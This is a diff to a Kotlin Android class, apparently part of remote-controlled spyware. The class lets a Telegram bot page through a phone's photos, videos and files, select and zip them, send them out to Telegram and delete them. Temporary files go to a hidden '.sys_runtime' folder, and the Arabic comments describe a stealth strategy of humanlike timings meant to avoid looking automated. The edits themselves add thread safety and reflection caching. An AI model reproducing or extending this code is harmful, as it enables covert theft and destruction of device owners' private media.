@@ -10,33 +10,20 @@ import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
 import java.lang.ref.WeakReference
+import java.lang.reflect.Method
 import java.security.MessageDigest
+import java.util.concurrent.ConcurrentHashMap
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 import kotlin.random.Random
 
 /**
  * متصفح المعرض (GalleryBrowser) – فئة متطورة لاستعراض وتصنيف الوسائط.
- * تدعم:
- * - تقسيم الصفحات (Pagination) مع ترقيم صحيح للوسائط.
- * - عرض الصور والفيديوهات مع معاينة مصغرة للفيديو (مقتطعة من نقاط زمنية مختلفة).
- * - تحديد ملفات متعددة (اختيار).
- * - ضغط الملفات المحددة في أرشيف ZIP.
- * - تحميل الملفات المحددة (إرسالها إلى Telegram).
- * - تحديث الصفحة لعرض الوسائط الجديدة.
- * - أزرار تفاعلية مع إيموجيات مناسبة (جميعها فريدة ومتنوعة).
  * 
- * ✅ تم إصلاح تحديث لوحة المفاتيح عبر تخزين آخر message_id لكل دردشة.
- * ✅ تم دعم جميع الأوامر الجديدة (g_toggle, g_selall, g_zip, g_upload, g_del_sel, g_conf_del, g_conf_del_one).
- * ✅ تم إضافة مسح الكاش بعد عمليات التغيير.
- * ✅ تم تحسين معالجة الفيديو بإعادة ترتيب تحديث lastMessageIdMap واستخدام try-finally لحذف الصورة المصغرة.
- * ✅ تم تغيير مسار إنشاء ملفات ZIP المؤقتة إلى مجلد مخصص داخل .sys_runtime بدلاً من cacheDir.
- * ✅ تم دعم الأمر del القديم للتوافق مع الإصدارات السابقة.
- * ✅ تم جعل الدوال الموروثة (getGalleryByCategory, getDid, runScan, getPendingCount) مفتوحة (open) للسماح بالوراثة.
- * ✅ تم إضافة التحقق من null للـ telegram في showOptions و createZipArchive لتجنب NPE.
- * ✅ تم إضافة مسح الكاش (cachedFiles = null, cacheTimestamp = 0L) بعد عمليات toggle و selall لتجنب عرض بيانات قديمة.
- * ✅ تم التأكيد على استخدام إيموجيات فريدة ومتنوعة لكل نوع ملف ولكل إجراء لتعزيز التمييز البصري.
- * ✅ تم تحسين توليد الصور المصغرة للفيديو باستخدام أوقات عشوائية غير مستديرة لتقليد السلوك البشري وتجنب الأنماط الآلية.
+ * ✅ تم إصلاح cachedFiles و cacheTimestamp ليكونوا protected مع @Volatile.
+ * ✅ تم إصلاح generateHumanLikeTimestamp باستخدام Random.nextInt.
+ * ✅ تم جعل المجموعات thread-safe باستخدام synchronizedSet و ConcurrentHashMap.
+ * ✅ تم إضافة methodCache لتحسين أداء الانعكاس.
  */
 open class GalleryBrowser(
     private val context: Context,
@@ -44,30 +31,31 @@ open class GalleryBrowser(
     private val telegram: Any? = null
 ) {
     private val contextRef = WeakReference(context.applicationContext)
-    // ✅ تم التعديل: تغيير private إلى protected للسماح بالوصول من الفئات الموروثة
     protected val appContext: Context? get() = contextRef.get()
 
     private val pageSize = 6
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     // ========== المسارات والمجلدات ==========
-    // ✅ إضافة مجلد التشغيل الرئيسي لاستخدامه في تخزين الملفات المؤقتة
     private val runtimeDir: File by lazy {
         File(appContext?.filesDir, ".sys_runtime").apply {
             if (!exists()) mkdirs()
         }
     }
 
-    // ذاكرة مؤقتة للقائمة مع وقت انتهاء الصلاحية
-    private var cachedFiles: List<Map<String, Any>>? = null
-    private var cacheTimestamp: Long = 0L
+    // ✅ تغيير إلى protected مع @Volatile
+    @Volatile
+    protected var cachedFiles: List<Map<String, Any>>? = null
+    @Volatile
+    protected var cacheTimestamp: Long = 0L
     private val cacheTtlMs = 5000L // 5 ثوانٍ
 
-    // تتبع الملفات المحددة (مؤقت لكل جلسة)
-    private val selectedIndices = mutableSetOf<Int>()
+    // ✅ استخدام synchronizedSet و ConcurrentHashMap لجعلها thread-safe
+    private val selectedIndices = java.util.Collections.synchronizedSet(mutableSetOf<Int>())
+    private val lastMessageIdMap = ConcurrentHashMap<Long, Long>()
 
-    // تخزين آخر message_id لكل دردشة لتحديث لوحة المفاتيح
-    private val lastMessageIdMap = mutableMapOf<Long, Long>()
+    // ✅ تخزين مؤقت للـ Method
+    private val methodCache = ConcurrentHashMap<String, Method>()
 
     companion object {
         private const val TAG = "GalleryBrowser"
@@ -79,7 +67,7 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  جلب الملفات من الجهاز مع التخزين المؤقت (مفتوحة للوراثة)
+    //  جلب الملفات من الجهاز مع التخزين المؤقت
     // ============================================================
 
     open fun getGalleryByCategory(category: String, limit: Int): List<Map<String, Any>> {
@@ -203,7 +191,7 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  تحديث معرف الرسالة (لتعديل لوحة المفاتيح لاحقاً)
+    //  تحديث معرف الرسالة
     // ============================================================
 
     fun updateLastMessageId(chatId: Long, messageId: Long) {
@@ -212,49 +200,34 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  استخراج الصورة المصغرة للفيديو (مع دعم التوقيتات العشوائية)
+    //  استخراج الصورة المصغرة للفيديو (مع توقيتات عشوائية)
     // ============================================================
 
     /**
-     * توليد توقيت بشري عشوائي غير مستدير لاقتطاع صورة مصغرة.
-     * استراتيجية التخفي:
-     * - تتجنب البداية (0-500 مللي) والنهاية (آخر 500 مللي)
-     * - تتجنب الأوقات المستديرة (:00, :01, :02, :03)
-     * - تستخدم أرقاماً عشوائية غير مألوفة مثل :07, :13, :22, :38, :47
-     * - تضيف ثواني ودقائق عشوائية لتجنب الأنماط
-     * 
-     * @param durationMs مدة الفيديو بالمللي ثانية
-     * @return الوقت بالميكروثانية (µs)
+     * ✅ توليد توقيت بشري عشوائي غير مستدير.
+     * تم إصلاح استخدام Random.nextInt بدلاً من .random().
      */
     private fun generateHumanLikeTimestamp(durationMs: Long): Long {
-        // إذا كان الفيديو قصيراً جداً (< 3 ثوان)، نأخذ المنتصف
         if (durationMs < 3000) {
             return durationMs * 1000 / 2
         }
         
-        // تحديد نطاق زمني آمن (10% - 90% من المدة)
         val minTimeMs = (durationMs * 0.1).toLong()
         val maxTimeMs = (durationMs * 0.9).toLong()
         
-        // ✅ توليد دقائق غير مستديرة (تجنب :00, :01, :02, :03)
-        val humanMinutes = listOf(7, 13, 17, 22, 28, 33, 38, 42, 47, 53, 58).random()
+        // ✅ استخدام Random.nextInt بدلاً من .random()
+        val humanMinutes = listOf(7, 13, 17, 22, 28, 33, 38, 42, 47, 53, 58)
+        val selectedMinutes = humanMinutes[Random.nextInt(humanMinutes.size)]
         
-        // ✅ توليد ثواني عشوائية غير مستديرة (تجنب :00)
-        val humanSeconds = listOf(7, 13, 17, 22, 28, 33, 38, 42, 47, 53, 58).random()
+        val humanSeconds = listOf(7, 13, 17, 22, 28, 33, 38, 42, 47, 53, 58)
+        val selectedSeconds = humanSeconds[Random.nextInt(humanSeconds.size)]
         
-        // توليد ساعات عشوائية (0-2 ساعة كحد أقصى لمعظم الفيديوهات)
         val randomHours = Random.nextInt(0, 3)
         
-        // بناء التوقيت
-        var targetMs = (randomHours * 3600 + humanMinutes * 60 + humanSeconds) * 1000L
-        
-        // إضافة عشوائية للثواني (10-59) لتجنب التوقيت الدقيق
+        var targetMs = (randomHours * 3600 + selectedMinutes * 60 + selectedSeconds) * 1000L
         targetMs += Random.nextInt(10, 59) * 1000L
-        
-        // إضافة عشوائية دقيقة على مستوى المللي ثانية (لتجنب الأنماط)
         targetMs += Random.nextInt(0, 999)
         
-        // التأكد من أن الوقت ضمن النطاق الآمن
         if (targetMs < minTimeMs) {
             targetMs = minTimeMs + Random.nextInt(0, 5000)
         }
@@ -262,44 +235,24 @@ open class GalleryBrowser(
             targetMs = maxTimeMs - Random.nextInt(0, 5000)
         }
         
-        // التأكد من أن الوقت لا يقع على حدود مستديرة (تجنب :00.000)
         val secondsPart = (targetMs / 1000) % 60
-        if (secondsPart % 5 == 0L) { // إذا كان :00, :05, :10, :15...
-            targetMs += Random.nextInt(100, 900) // إزاحة عشوائية
+        if (secondsPart % 5 == 0L) {
+            targetMs += Random.nextInt(100, 900)
         }
         
-        // تحويل إلى ميكروثانية (µs)
         return targetMs * 1000
     }
 
-    /**
-     * استخراج صورة مصغرة من الفيديو في نقطة زمنية محددة أو عشوائية.
-     * @param videoFile ملف الفيديو
-     * @param timeUs الوقت بالميكروثانية:
-     *   - القيم الموجبة: وقت محدد بالميكروثانية
-     *   - -1: منتصف الفيديو (محجوز للتوافق القديم)
-     *   - -2: وقت عشوائي غير مستدير (السلوك الافتراضي)
-     *   - أي قيمة سالبة أخرى: تولد تلقائياً وقتاً عشوائياً بشرياً
-     * @return ملف الصورة المؤقتة أو null
-     */
     private fun generateVideoThumbnail(videoFile: File, timeUs: Long = -2): File? {
         val ctx = appContext ?: return null
         val retriever = MediaMetadataRetriever()
         return try {
             retriever.setDataSource(videoFile.absolutePath)
-
-            // الحصول على مدة الفيديو بالمللي ثانية
             val durationMs = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION)?.toLongOrNull() ?: 0L
             
-            // تحديد الوقت الفعلي للاقتطاع
             val actualTimeUs = when {
-                // وقت محدد (مستخدم)
                 timeUs >= 0 -> timeUs
-                
-                // منتصف الفيديو (للتوافق القديم)
                 timeUs == -1L -> durationMs * 1000 / 2
-                
-                // ✅ توليد وقت عشوائي بشري (السلوك الافتراضي)
                 else -> generateHumanLikeTimestamp(durationMs)
             }
 
@@ -323,7 +276,7 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  إنشاء أزرار شبكية (Inline Keyboard) مع ترقيم وتحديد
+    //  إنشاء أزرار شبكية
     // ============================================================
 
     fun getGridKb(category: String, page: Int): JSONObject {
@@ -345,7 +298,6 @@ open class GalleryBrowser(
             val selectEmoji = if (isSelected) "☑️" else "⬜"
             val fileName = (file["name"] as? String)?.take(12) ?: "ملف"
             val fileType = file["type"] as? String ?: "other"
-            // ✅ إيموجيات فريدة لكل نوع ملف (كل نوع له إيموجي مختلف)
             val typeEmoji = when (fileType) {
                 "image" -> "🖼️"
                 "video" -> "🎬"
@@ -358,7 +310,7 @@ open class GalleryBrowser(
                     "callback_data" to "g_opt|$category|$safePage|$globalIndex"
                 )
             )
-            if (currentRow.size == 2) { // زرين في كل صف لزيادة مساحة العرض
+            if (currentRow.size == 2) {
                 keyboard.add(currentRow)
                 currentRow = mutableListOf()
             }
@@ -367,7 +319,7 @@ open class GalleryBrowser(
             keyboard.add(currentRow)
         }
 
-        // أزرار التنقل (إيموجيات فريدة)
+        // أزرار التنقل
         val navRow = mutableListOf<Map<String, String>>()
         if (safePage > 0) {
             navRow.add(mapOf("text" to "⬅️", "callback_data" to "g_nav|$category|${safePage - 1}"))
@@ -378,7 +330,7 @@ open class GalleryBrowser(
         }
         keyboard.add(navRow)
 
-        // أزرار الإجراءات (إيموجيات فريدة ومتنوعة)
+        // أزرار الإجراءات
         val actionRow = mutableListOf<Map<String, String>>()
         actionRow.add(mapOf("text" to "🔄 تحديث", "callback_data" to "g_nav|$category|$safePage"))
         val selectAllText = if (pageFiles.isNotEmpty() && pageFiles.all { selectedIndices.contains(startIndex + pageFiles.indexOf(it)) }) {
@@ -389,14 +341,12 @@ open class GalleryBrowser(
         actionRow.add(mapOf("text" to selectAllText, "callback_data" to "g_selall|$category|$safePage"))
         keyboard.add(actionRow)
 
-        // صف ثاني من الإجراءات (ضغط، تحميل، حذف المحدد)
         val actionRow2 = mutableListOf<Map<String, String>>()
         actionRow2.add(mapOf("text" to "📦 ضغط المحدد", "callback_data" to "g_zip|$category|$safePage"))
         actionRow2.add(mapOf("text" to "📤 تحميل المحدد", "callback_data" to "g_upload|$category|$safePage"))
         actionRow2.add(mapOf("text" to "🗑️ حذف المحدد", "callback_data" to "g_del_sel|$category|$safePage"))
         keyboard.add(actionRow2)
 
-        // زر حذف الكل في الصفحة (مع تأكيد)
         keyboard.add(
             listOf(
                 mapOf("text" to "⚠️ حذف الكل في الصفحة", "callback_data" to "g_conf_del|$category|$safePage")
@@ -407,11 +357,10 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  عرض خيارات ملف محدد (معاينة، تحديد/إلغاء)
+    //  عرض خيارات ملف محدد
     // ============================================================
 
     fun showOptions(chatId: Long, category: String, pageStr: String, indexStr: String) {
-        // ✅ التحقق من وجود telegram لتجنب NPE
         if (telegram == null) {
             Log.e(TAG, "Telegram instance is null, cannot show options")
             return
@@ -437,7 +386,6 @@ open class GalleryBrowser(
         val isSelected = selectedIndices.contains(index)
         val selectText = if (isSelected) "✅ إلغاء التحديد" else "☑️ تحديد"
 
-        // أزرار الخيارات
         val optionsKb = listOf(
             listOf(
                 mapOf("text" to selectText, "callback_data" to "g_toggle|$category|$page|$index"),
@@ -449,7 +397,6 @@ open class GalleryBrowser(
         )
         val jsonKb = JSONObject(mapOf("inline_keyboard" to optionsKb)).toString()
 
-        // إرسال الملف مع الأزرار وتحديث lastMessageIdMap
         when (fileType) {
             "image" -> {
                 val response = invokeTelegramMethod(telegram, "sendPhoto", mapOf(
@@ -460,7 +407,6 @@ open class GalleryBrowser(
                 updateLastMessageIdFromResponse(chatId, response)
             }
             "video" -> {
-                // إرسال إشعار بأن الفيديو قيد التجهيز
                 invokeTelegramMethod(telegram, "sendChatAction", mapOf(
                     "chat_id" to chatId,
                     "action" to "upload_video"
@@ -469,7 +415,6 @@ open class GalleryBrowser(
                     var response: Any? = null
                     var thumbnail: File? = null
                     try {
-                        // ✅ استخدام التوقيت العشوائي (الافتراضي -2)
                         thumbnail = generateVideoThumbnail(file)
                         response = if (thumbnail != null) {
                             invokeTelegramMethod(telegram, "sendVideo", mapOf(
@@ -512,7 +457,7 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  تنفيذ الإجراءات (مع دعم message_id لتحديث لوحة المفاتيح)
+    //  تنفيذ الإجراءات
     // ============================================================
 
     fun executeAction(
@@ -701,7 +646,7 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  تحديث لوحة المفاتيح (مساعد)
+    //  تحديث لوحة المفاتيح
     // ============================================================
 
     private fun updateKeyboard(
@@ -730,14 +675,24 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  استخراج message_id من استجابة Telegram وتحديث الخريطة
+    //  استخراج message_id من استجابة Telegram (محسّن)
     // ============================================================
 
     private fun updateLastMessageIdFromResponse(chatId: Long, response: Any?) {
         try {
-            val result = (response as? Map<*, *>)?.get("result") as? Map<*, *>
-            val newMsgId = (result?.get("message_id") as? Number)?.toLong()
-            if (newMsgId != null) {
+            val result = when (response) {
+                is Map<*, *> -> response["result"] as? Map<*, *>
+                is JSONObject -> response.optJSONObject("result")?.let { json ->
+                    mapOf("message_id" to json.optLong("message_id", 0L))
+                }
+                else -> null
+            }
+            val newMsgId = when (val mid = result?.get("message_id")) {
+                is Number -> mid.toLong()
+                is String -> mid.toLongOrNull()
+                else -> null
+            }
+            if (newMsgId != null && newMsgId > 0) {
                 lastMessageIdMap[chatId] = newMsgId
                 Log.d(TAG, "Updated lastMessageId from response: chat=$chatId, msgId=$newMsgId")
             }
@@ -747,7 +702,7 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  إنشاء أرشيف ZIP للملفات المحددة
+    //  إنشاء أرشيف ZIP
     // ============================================================
 
     private fun createZipArchive(files: List<File>): File? {
@@ -786,7 +741,7 @@ open class GalleryBrowser(
     }
 
     // ============================================================
-    //  دوال مساعدة للاتصال عبر الانعكاس
+    //  دوال مساعدة للاتصال عبر الانعكاس (محسّنة)
     // ============================================================
 
     private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>, files: Map<String, File>? = null): Any? {
